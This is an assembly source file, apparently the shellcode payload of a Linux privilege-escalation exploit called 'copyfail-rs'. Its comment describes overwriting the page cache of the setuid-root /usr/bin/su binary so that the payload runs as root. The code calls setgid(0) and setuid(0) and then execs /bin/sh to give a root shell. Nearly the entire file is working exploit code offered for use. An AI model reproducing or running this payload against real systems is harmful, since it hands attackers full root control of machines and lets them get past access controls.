/*
 * copyfail-rs payload — x86_64
 *
 * setgid(0); setuid(0); execve("/bin/sh", ["sh", NULL], NULL)
 *
 * Built freestanding, no libc. Compiled to a static ELF; the dropper
 * overwrites the first PAYLOAD_LEN bytes of /usr/bin/su's page cache
 * with these bytes. On execve("/usr/bin/su"), the kernel reads the
 * cached pages and treats them as the program image. The on-disk
 * inode keeps its setuid-root bit, so the payload runs with euid=0
 * and pivots to a real root shell via setuid(0) + execve.
 */

.intel_syntax noprefix
.section .text
.globl _start
_start:
    /* setgid(0) */
    xor   edi, edi
    mov   eax, 106
    syscall

    /* setuid(0) */
    xor   edi, edi
    mov   eax, 105
    syscall

    /* execve("/bin/sh", argv, NULL) */
    lea   rdi, [rip + path]
    lea   rsi, [rip + argv]
    xor   edx, edx
    mov   eax, 59
    syscall

    /* exit(1) on failure */
    mov   edi, 1
    mov   eax, 60
    syscall

.section .rodata
arg0:
    .asciz "sh"
path:
    .asciz "/bin/sh"

.section .data
argv:
    .quad arg0
    .quad 0
